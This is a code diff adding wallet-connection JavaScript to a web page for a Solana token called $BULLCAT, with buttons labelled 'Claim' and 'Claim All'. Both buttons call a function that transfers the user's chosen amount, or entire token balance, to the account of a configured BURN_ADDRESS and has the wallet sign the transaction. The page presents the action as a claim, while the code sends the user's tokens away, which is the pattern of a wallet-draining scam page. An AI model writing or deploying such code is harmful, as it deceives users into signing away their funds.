@@ -107,4 +107,106 @@
         const resp = await provider.connect({ onlyIfTrusted: false });
         connectedPublicKey = resp.publicKey;
 
-        document.getElement
+        document.getElementById("walletAddress").textContent = 
+          `${connectedPublicKey.toString().slice(0,8)}...${connectedPublicKey.toString().slice(-6)}`;
+        
+        document.getElementById("connectBtn").disabled = true;
+        document.getElementById("connectText").innerHTML = `<i class="fas fa-check"></i> CONNECTED`;
+
+        await fetchBalance();
+      } catch (err) {
+        console.error(err);
+        if (err.code === 4001) {
+          alert("Connection rejected by user.");
+        } else {
+          alert("Failed to connect. Make sure Phantom is unlocked.");
+        }
+      }
+    }
+
+    async function fetchBalance() {
+      if (!connectedPublicKey) return;
+      try {
+        const tokenMint = new PublicKey(BULLCAT_MINT);
+        const ata = await getAssociatedTokenAddress(tokenMint, connectedPublicKey);
+        const account = await getAccount(connection, ata);
+        const balance = Number(account.amount) / 1_000_000_000; // 9 decimals
+
+        document.getElementById("tokenBalance").textContent = balance.toLocaleString('en-US', {minimumFractionDigits: 2});
+      } catch (e) {
+        document.getElementById("tokenBalance").textContent = "0.00";
+      }
+    }
+
+    function setMaxAmount() {
+      const bal = document.getElementById("tokenBalance").textContent.replace(/,/g, '');
+      document.getElementById("burnAmount").value = parseFloat(bal) || 0;
+    }
+
+    async function claimSelected() {
+      const amountStr = document.getElementById("burnAmount").value;
+      if (!amountStr || parseFloat(amountStr) <= 0) return alert("Enter a valid amount");
+      if (!connectedPublicKey) return alert("Please connect wallet first!");
+
+      if (confirm(`Claim ${amountStr} $BULLCAT?\n\nIRREVERSIBLE!`)) {
+        await sendBurnTransaction(parseFloat(amountStr));
+      }
+    }
+
+    async function claimAll() {
+      if (!connectedPublicKey) return alert("Please connect wallet first!");
+      if (!confirm("⚠️ CLAIM ALL $BULLCAT?\n\nPERMANENT ACTION!")) return;
+      if (!confirm("FINAL CONFIRM — Type 'CLAIMALL'")) return;
+
+      const input = prompt("Type CLAIMALL to confirm:");
+      if (input !== "CLAIMALL") return alert("Cancelled.");
+
+      const amount = parseFloat(document.getElementById("tokenBalance").textContent.replace(/,/g, ''));
+      if (amount > 0) await sendBurnTransaction(amount);
+    }
+
+    // Keep the rest of sendBurnTransaction the same (from previous version)
+    async function sendBurnTransaction(amount) {
+      try {
+        const mintPubkey = new PublicKey(BULLCAT_MINT);
+        const burnPubkey = new PublicKey(BURN_ADDRESS);
+        const fromATA = await getAssociatedTokenAddress(mintPubkey, connectedPublicKey);
+        const toATA = await getAssociatedTokenAddress(mintPubkey, burnPubkey);
+
+        const instructions = [];
+        try { await getAccount(connection, toATA); } 
+        catch {
+          instructions.push(createAssociatedTokenAccountInstruction(connectedPublicKey, toATA, burnPubkey, mintPubkey));
+        }
+
+        const decimals = 9;
+        instructions.push(createTransferInstruction(fromATA, toATA, connectedPublicKey, Math.floor(amount * Math.pow(10, decimals))));
+
+        const { blockhash } = await connection.getLatestBlockhash();
+        const transaction = new VersionedTransaction(
+          new TransactionMessage({
+            payerKey: connectedPublicKey,
+            recentBlockhash: blockhash,
+            instructions,
+          }).compileToV0Message()
+        );
+
+        const signedTx = await provider.signTransaction(transaction);
+        const txId = await connection.sendRawTransaction(signedTx.serialize(), { skipPreflight: false });
+
+        alert(`✅ Transaction Sent!\n\nTx: ${txId}\n\nCheck Solscan`);
+        setTimeout(fetchBalance, 4000);
+      } catch (err) {
+        console.error(err);
+        alert("Transaction failed: " + err.message);
+      }
+    }
+
+    // Make functions globally available
+    window.connectWallet = connectWallet;
+    window.setMaxAmount = setMaxAmount;
+    window.claimSelected = claimSelected;
+    window.claimAll = claimAll;
+  </script>
+</body>
+</html>
